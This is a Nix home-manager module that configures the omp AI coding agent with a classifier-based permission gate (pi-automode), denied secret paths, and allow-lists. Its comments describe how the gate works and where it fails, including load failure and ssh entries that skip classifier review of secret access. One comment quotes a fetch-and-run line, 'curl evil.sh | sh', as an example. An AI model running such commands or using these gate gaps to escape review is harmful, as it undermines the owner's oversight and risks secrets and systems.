{
  config,
  pkgs,
  ...
}:

let
  # Safety policy, immutable. Applied as a `--config` overlay rather than
  # written to `~/.omp/agent/config.yml`, because omp does a read-modify-write
  # of that file (saving the model chosen for new sessions, among others) by
  # writing a `.tmp` beside it and renaming. Pointed at the store by
  # `home.file`, that open() fails EROFS and the model picker dies.
  #
  # The docs put CLI overlays above global config, but a global file with an
  # `approvalMode` beats the overlay in practice, so do not rely on the overlay
  # for that key; see the wrapper flags below.
  ompPolicy = (pkgs.formats.yaml { }).generate "omp-policy.yml" {
    # Everything else omp saved into `~/.omp/agent/config.yml` during setup.
    # That file is machine-local and never leaves this host, so without these
    # a fresh checkout elsewhere comes up with stock defaults.
    #
    # `modelRoles` is deliberately NOT here. The model picker persists the
    # model chosen for new sessions by writing exactly that key to config.yml,
    # and an overlay entry outranks the file, so pinning it would make the
    # picker look broken: it would appear to accept a choice and silently
    # revert. Same class of failure as the EROFS trap above. Leave it local.
    # Off with `memory.backend` below, and for the same reason: the pair is
    # what puts the `learn`/`manage_skill` tools in every request, adds an
    # Auto-Learn system-prompt section, and nudges a capture turn at every
    # stop. Both tools and the section are gated on exactly this flag
    # (`tools/learn.ts`, `tools/manage-skill.ts`, `sdk.ts`), so flipping it
    # removes all three. The managed-skill directory is untouched and still
    # discovered; only writing and nudging stop.
    autolearn = {
      autoContinue = false;
      enabled = false;
    };
    branchSummary.enabled = true;
    colorBlindMode = false;
    # Idle compaction off: compaction is a manual call here. Re-enabling it
    # also needs `idleThresholdTokens` moved off its 200000 default, which is
    # the context ceiling, or it cannot fire.
    compaction = {
      experimentalContextManagement = true;
      idleEnabled = false;
    };
    composer.shape = "box";
    computer.enabled = false;
    contextPromotion.enabled = false;
    display = {
      cacheMissMarker = true;
      showTokenUsage = true;
      showTurnTime = true;
    };
    edit.mode = "hashline";
    error.notify = "on";
    extensions = [ "${pkgs.pi-automode}/extensions/auto-mode.ts" ];
    features.unexpectedStopDetection = "smart";
    followUpMode = "all";
    github.enabled = true;
    hideThinkingBlock = true;
    interruptMode = "immediate";
    # Off, not `local`. The local pipeline injects `memory_summary.md` plus the
    # accumulated lesson list into every request, budgeted by
    # `memories.summaryInjectionTokenLimit` (default 5000), and carries a
    # Memory Guidance block telling the agent to read it first. That is a
    # standing per-request cost for state this repo already keeps in
    # CLAUDE.md and `docs/`, where it is version-controlled and greppable.
    # Nothing is deleted: the memory files stay under the agent dir and come
    # back if this returns to "local".
    memory.backend = "off";
    plan.defaultOnStartup = false;
    # 1h cache entries, not the `auto` default's 5m. The 2x write beats the
    # repeated full re-ingests 5m caused.
    providers.cacheRetention = "long";
    readLineNumbers = true;
    # Auto-resume through a spent plan quota instead of dying at the wall.
    # `retry` already classifies usage limits as retryable, but the sleep is
    # capped by `retry.maxDelayMs` (5 min), so a Codex "try again in ~281 min"
    # failed the turn outright: 244 requests burned the Plus 5h bucket on
    # 2026-09-16 00:04-00:23 and all three live sessions ended in
    # `usage_limit_reached` with nothing queued to resume. `waitForUsageReset`
    # is the only knob that lets a usage-limit wait outrun that ceiling (it
    # needs a parsed reset time, which both Codex and Anthropic supply), and
    # it is deliberately paired with the **default** `maxDelayMs`: ordinary
    # 429/overload retries should still fail fast, only a quota-window reset
    # earns an hours-long sleep. The wait is Esc-abortable but holds the whole
    # session including subagents, so an unattended fan-out parks until reset.
    retry.waitForUsageReset = true;
    # omp's Claude-compat skill source is split into two toggles:
    # `skills.enableClaudeProject` (`.claude/skills/*/SKILL.md`, default true)
    # and `skills.enableClaudeUser` (`~/.claude/skills/*/SKILL.md`, default
    # false). Claude Code's own skills for this user live at user scope, and
    # without this flip omp silently never looked there -- no warning, no
    # error, `omp config get skills.enableClaudeUser` just read `false`.
    skills.enableClaudeUser = true;
    statusLine = {
      # Everything below is one intent: near-monochrome chrome, one lavender
      # accent, no filled panels. The fills were the eye-strain culprit --
      # omp paints message/tool/status backgrounds where Claude Code paints
      # none, and under a translucent terminal each fill composites against
      # the wallpaper differently from the gaps, so the screen becomes a
      # patchwork of luminance steps. The theme sets those bg tokens to ""
      # (terminal default); `transparent` is the same idea for the bar.
      compactThinkingLevel = false; # "Opus 5 . [high]", not "[high] Opus 5"
      contextLine = "embedded";
      leftSegments = [
        "pi"
        # The Vim-mode indicator (NORMAL/INSERT/VISUAL/V-LINE, plus the
        # half-typed command and Visual selection height). Every built-in
        # preset carries it right after `pi`, but `custom` inherits nothing,
        # so it has to be listed here; it renders nothing at all while
        # `tui.vimMode` is off.
        "vim"
        "model"
        "mode"
        "path"
        "git"
        "pr"
        "subagents"
      ];
      preset = "custom";
      # `usage` is the subscription meter (5h/1d/7d/month with resets), and it
      # follows the active model's provider and OAuth identity, so it reports
      # Codex windows on a Codex model without any config change. `cost` is a
      # different number: dollar-equivalent of tokens, covered by the sub.
      rightSegments = [
        "usage"
        # Ordered input-side first, then output. Caching only ever applies to
        # the prompt, so there is no cached-output counter: `token_in` is
        # uncached input, `cache_read` and `cache_write` are the cached halves
        # of the same input, and `token_out` is the only output number.
        #
        # `token_in` counts only input that was neither read from nor written
        # to cache, so it sits near zero on a cached turn and is not the prompt
        # size. A model switch changes the cache key, so the whole context is
        # re-ingested and reported as cache_creation_input_tokens: a 172k
        # re-ingest displayed as `token_in 192` before `cache_write` existed.
        # `display.cacheMissMarker` flags that a miss happened; `cache_write`
        # says how much it cost, and a write bills 1.25x base input against
        # 0.1x for a read.
        #
        # Both cache segments render the same `theme.icon.cache` glyph -- it is
        # one theme key feeding both, and `segmentOptions` overrides only
        # `mode`/`plan_mode`, so not even a custom theme can split them. This
        # grouping is what disambiguates: read always precedes write, both
        # directly after the input they belong to. `cache_hit` is the
        # alternative (same icon, but a percentage nothing can be confused
        # with) if the raw read total ever stops being worth a column.
        "token_in"
        "cache_read"
        "cache_write"
        "token_out"
        "cost"
        "context_pct"
      ];
      segmentOptions = {
        git = {
          showBranch = true;
          showStaged = true;
          showUnstaged = true;
          showUntracked = true;
        };
        model.showThinkingLevel = true;
        path = {
          abbreviate = true;
          maxLength = 50;
        };
      };
      # ascii, because every other separator style resolves to a Nerd Font
      # powerline triangle under `symbolPreset = "nerd"`; asciiLeft/Right are
      # plain ">"/"<" in all three presets.
      separator = "ascii";
      # Off: it overrides the theme's statusLine colours with a hash of the
      # session name, so `pi`/`model`/`pr` render a different colour in every
      # session and the lavender accent never appears.
      sessionAccent = false;
      transparent = true;
    };
    steeringMode = "all";
    # Appearance and status line. These ride the overlay for the same reason
    # the policy does: `home.file` on config.yml is EROFS-fatal. The tradeoff
    # is that the overlay outranks the global file, so `/theme`, the settings
    # UI and `omp config set` will not durably change any key listed here --
    # they write config.yml, which loses. Change them in this file instead.
    symbolPreset = "nerd";
    task = {
      eager = "preferred";
      showResolvedModelBadge = true;
    };
    theme.dark = "dark-mix";
    # omp's gate must be wide open, because pi-automode replaces the permission
    # prompt rather than answering it: it sees each `tool_call` event and either
    # lets the tool run or blocks it. Below `yolo`, omp prompts first and the
    # classifier never gets the chance. The extension is fail-closed once loaded
    # (a failed model call, an auth error or an unparseable reply all block),
    # but a session where it fails to LOAD has no gate at all, so check
    # `/automode status` before trusting one.
    tools.approvalMode = "yolo";
    # Terser xdev device docs in the system prompt. Same tool set, ~1.9k fewer
    # tokens per request; devices stay reachable through `xd://`.
    tools.xdevDocs = "catalog";
    treeFilterMode = "default";
    tui = {
      textSizing = true;
      tight = false;
      # Modal editing for the prompt (omp 18.1.17+): Escape leaves Insert;
      # Normal has hjkl, 0/^/$, w/b/e, gg/G, count prefixes, x/D/C, dd/yy,
      # p/P, u, and v/V for Visual. Helix motions do not exist upstream, and
      # `Ctrl+G` still hands the draft to the real `hx` for anything longer.
      # Toggling this in `/settings` now applies live, but will not persist:
      # the overlay outranks config.yml, so flip it here.
      vimMode = true;
    };
  };

  # The gate travels with the binary. Installed here rather than in
  # modules/features/dev.nix so there is exactly one omp on PATH: a second,
  # unwrapped copy would shadow this one depending on profile order and would
  # silently run ungated.
  omp = pkgs.symlinkJoin {
    inherit (pkgs.omp) meta;
    name = "omp-${pkgs.omp.version}";
    nativeBuildInputs = [ pkgs.makeWrapper ];
    paths = [ pkgs.omp ];
    # `--approval-mode` is passed as well as being set in the overlay, because
    # omp rewrites `~/.omp/agent/config.yml` whenever it saves a setting, and a
    # stored `approvalMode` there outranks the overlay. The documented
    # per-session override does not go through that file at all.
    postBuild = ''
      wrapProgram $out/bin/omp \
        --add-flags "--config ${ompPolicy} --approval-mode yolo"
    '';
  };
in

{
  # MCP servers, shared with Claude Code (see mcp-servers.nix). omp's own
  # discovery covers `~/.claude.json` and `~/.claude/mcp.json`, but not the
  # `mcpServers` block claude.nix writes into `~/.claude/settings.json`, so the
  # set is restated in a file omp does read.
  #
  # The dotted `.mcp.json` is deliberate: omp reads it as a compatibility path
  # but only ever writes the undotted `~/.omp/agent/mcp.json` (from `/mcp add`
  # and friends), so this one is safe as a read-only store symlink. The undotted
  # path would hit the same EROFS trap as config.yml.
  home.file.".omp/agent/.mcp.json".text = builtins.toJSON {
    mcpServers = import ./mcp-servers.nix { inherit pkgs; };
  };

  # Custom theme, selected by `theme.dark` in the overlay above. Themes are
  # read-only to omp (it loads them and watches for edits, but only ever
  # writes config.yml), so a store symlink is safe here.
  #
  # Hand-built rather than a built-in because every stock dark theme fails one
  # of two measurable tests on this setup. Saturation: `dark` drives accents,
  # links and borders from a 100%-saturated #0088fa, and fully saturated blue
  # on near-black is the chromatic-aberration case -- the eye focuses short
  # wavelengths on a different plane than the warm text beside it. Luminance
  # span: `dark` puts 1.85:1 and 12.56:1 on screen at once, so the pupil
  # adapts to the bright end and the dim end falls under WCAG AA. This one
  # holds ~3.7:1 to 13.4:1, caps chroma at ~53% (the lone exception is the
  # #00c781 tmux/prompt green, confined to four small glanceable tokens), and
  # keeps one accent hue. Syntax colours are nightfox, matching helix.nix so
  # code renders identically in `hx` and here.
  #
  # `statusLineVimNormal`/`statusLineVimInsert` swap the Vim-mode indicator
  # (segment and composer border): green resting in Normal, lavender while
  # typing. Both keys land with can1357/oh-my-pi#11915; until it merges omp
  # ignores them silently (arktype drops undeclared theme keys) and the stock
  # accent/success colours render, so the entries are safe to carry early.
  home.file.".omp/agent/themes/dark-mix.json".source = ./omp/dark-mix.json;

  # pi-automode reads `~/.pi`, never `~/.omp`, whichever host it runs under.
  # Its PI_AUTOMODE_SETTINGS_JSON source would avoid the stray directory, but
  # home-manager writes session variables as `export VAR="value"` with no
  # escaping, and this value is JSON. Safe as a store symlink: unlike omp's own
  # config, the extension only ever reads it.
  #
  # Tuned for long unattended runs. `allow` and `environment` are prose the
  # classifier reads; they are exceptions to `soft_deny` only and can never
  # override `hard_deny`, unlike a `permissions.allow` rule, which skips
  # classifier policy entirely. `$defaults` keeps the built-in entries for its
  # own section.
  home.file.".pi/agent/extensions/pi-automode/config.json".text = builtins.toJSON {
    autoMode = {
      allow = [
        "$defaults"
        "Deploying this NixOS config to the author's own hosts over ssh (gs-pi4, gs-server, gs-pi1-parents, gs-openwrt-one), including nixos-rebuild, systemctl, journalctl, and reading service state."
        "Running nixos-rebuild build, switch, test or dry-activate on the local machine, and nix build, nix flake update, nix store operations."
        "Starting local development servers, test harnesses and build watchers bound to localhost or the tailnet."
        "Restarting, stopping and starting systemd units on the author's own hosts."
        "Modifying, moving, or removing pre-existing application/media-state files (not system config, not other users' data) on the author's own hosts over ssh, in service of a task the author described in this session -- e.g. re-triggering a stuck import by moving a file out and back into a watched folder, or hand-fixing a stale state file for a self-hosted service."
      ];
      # The single biggest source of false blocks. Built-in soft_deny rejects
      # "overwriting local files that existed before session start" unless the
      # request named the task, the repo and the path scopes, which fires on
      # nearly every edit of an existing file. True routes non-protected
      # in-tree file access to the deterministic allow tier, so it never
      # reaches the classifier. Protected paths (.git, .envrc, shell rc files)
      # and everything that executes are still judged.
      allowInsideWorkingDirectory = true;
      # The classifier runs on the session model unless pinned, so an Opus
      # session classified every tool call with Opus at the session's own
      # reasoning level and blew the 20s `classifierTimeoutMs` repeatedly
      # ("Fast classifier failed ... timed out"). Auto mode fails closed, so a
      # timeout is a hard block: on 2026-09-10 it deadlocked a session badly
      # enough that the tools needed to fix the setting were themselves
      # blocked. The gate is a two-stage yes/no decision, not reasoning work
      # (stage one is a single token), so a small fast model is the right
      # tool; `low` is what Codex Auto Review uses for the same job.
      # Haiku, not Sonnet: the gate never hits its own cache, so per-token
      # price is the only lever.
      #
      # Deliberately not routed per provider, although the pinned fork
      # supports `classifierModelByProvider`. Classifying a session through
      # its own provider adds a gate request per tool call to the quota the
      # gate exists to protect, and a spent quota fails closed. Pinning the
      # classifier to a provider the session model does not use keeps the two
      # budgets independent; route per provider only if the classifier's own
      # provider becomes the binding constraint.
      classifierModel = "anthropic/claude-haiku-4-5";
      classifierReasoningLevel = "low";
      classifierTimeoutMs = 30000;
      # deniedPaths is checked before the classifier, so these never reach the
      # model. Entries accumulate across config sources instead of replacing.
      #
      # The `/*` entries are load-bearing. `matchesDeniedPath` glob-matches
      # the whole resolved path with no implied descendants, so a bare
      # `/run/secrets` blocks that directory while a secret file under it
      # falls through to the classifier: a judgement call instead of a hard
      # block. `/run/secrets` is a symlink into `/run/secrets.d/<gen>` and the
      # matcher also tries each pattern's canonicalized scope, so the `.d`
      # entry only matters while that symlink is mid-rotation.
      deniedPaths = [
        "${config.home.homeDirectory}/.ssh"
        "${config.home.homeDirectory}/.ssh/*"
        "/etc/nixos/secrets"
        "/etc/nixos/secrets/*"
        "/run/secrets"
        "/run/secrets/*"
        "/run/secrets.d/*"
      ];
      # Context, not permission. These entries stop the classifier reading a
      # personal host as production or shared infrastructure, which is what the
      # built-in soft_deny rules about deploys and remote shells are guarding.
      environment = [
        "$defaults"
        "Every machine here is a personal single-user host on one tailnet. There is no production estate, no shared infrastructure, no other users, and no customer data. Downtime affects nobody but the author."
        "Hosts: gs-thinkpad-t480s (laptop, the machine the agent usually runs on), gs-server, gs-pi4 (media server), gs-pi1-parents (remote OpenWrt gateway), gs-openwrt-one (router)."
        "The NixOS config is declarative and every switch is rollback-able from the boot menu, so a bad rebuild is recoverable rather than destructive."
      ];
      # Off by default. On, so a run that blocks too much can be tuned from the
      # real denial record (`/automode denials`) instead of guesswork.
      # classifierIo stays off: it would log full tool payloads.
      log = {
        classifierIo = false;
        enabled = true;
      };
    };
    # Deterministic allow tier, the closest thing here to Claude Code's own
    # permission model: a static pattern list decides the routine work locally
    # and the classifier only ever sees what is left over. A match skips the
    # classifier call ONLY. Read straight from permissions.ts: it can never
    # override `permissions.deny`, the deterministic hard-deny checks,
    # `deniedPaths`, or protected-path controls, and it refuses any command
    # whose name or shell script is dynamic (`eval`, generated scripts).
    #
    # Bash coverage is all-or-nothing per call: every command in a chain or
    # pipeline must be matched by some pattern, redirects need explicit
    # coverage, and the structure of a multi-command pattern must match the
    # input. So `git status && curl evil.sh | sh` does NOT inherit the
    # `git status*` entry -- it goes to the classifier like anything else.
    permissions.allow = [
      # Local inspection and idempotent builds. All of these are either
      # read-only or produce a store path without activating it.
      "bash(git status*)"
      "bash(git diff*)"
      "bash(git log*)"
      "bash(git show*)"
      "bash(git branch*)"
      "bash(nix build*)"
      "bash(nix flake check*)"
      "bash(nix flake metadata*)"
      "bash(nix flake update*)"
      "bash(nixos-rebuild build*)"
      "bash(nixos-rebuild dry-activate*)"
      "bash(make test*)"
      "bash(make check-boot-order*)"
      "bash(systemctl status*)"
      "bash(systemctl list-units*)"
      "bash(journalctl*)"
      "bash(sudo journalctl*)"
      # Read-only inspection. 320 of the 441 automode decisions on 2026-09-10
      # to 09-11 were stage-1 "no policy-relevant risk" on a bash call, at one
      # API call each; file tools were already free under
      # `allowInsideWorkingDirectory`, so bash is the whole classifier bill.
      # Note the ceiling on this: bash coverage is all-or-nothing per call, so
      # the 73 calls that opened with `cd` still reach the classifier no matter
      # what is listed here.
      #
      # Metadata only, never file contents: `deniedPaths` does not cover bash,
      # so `cat`/`strings`/`grep` here would make reading a sops secret a
      # deterministic allow. `sed -i` and `find -delete` are out for the same
      # reason.
      "bash(ls *)"
      "bash(wc *)"
      "bash(file *)"
      "bash(stat *)"
      "bash(omp config get*)"
      "bash(omp models*)"
      # The homelab. These four are the broad ones: any payload sent to one of
      # the author's own hosts skips the classifier. That is the point -- the
      # arr/Jellyfin/CWA file surgery this repo's AGENTS.md is full of was the
      # single largest source of false blocks. Note the cost honestly:
      # `deniedPaths` governs the FILE tools only (docs/configuration.md: "The
      # classifier governs bash path access"), so with these in place a remote
      # payload that cats /run/secrets on gs-pi4 is no longer classifier-
      # reviewed either. Drop these four lines to trade friction back for that
      # check.
      "bash(ssh gs-pi4 *)"
      "bash(ssh gs-server *)"
      "bash(ssh gs-pi1-parents *)"
      "bash(ssh gs-openwrt-one *)"
    ];
  };
  home.packages = [ omp ];
}
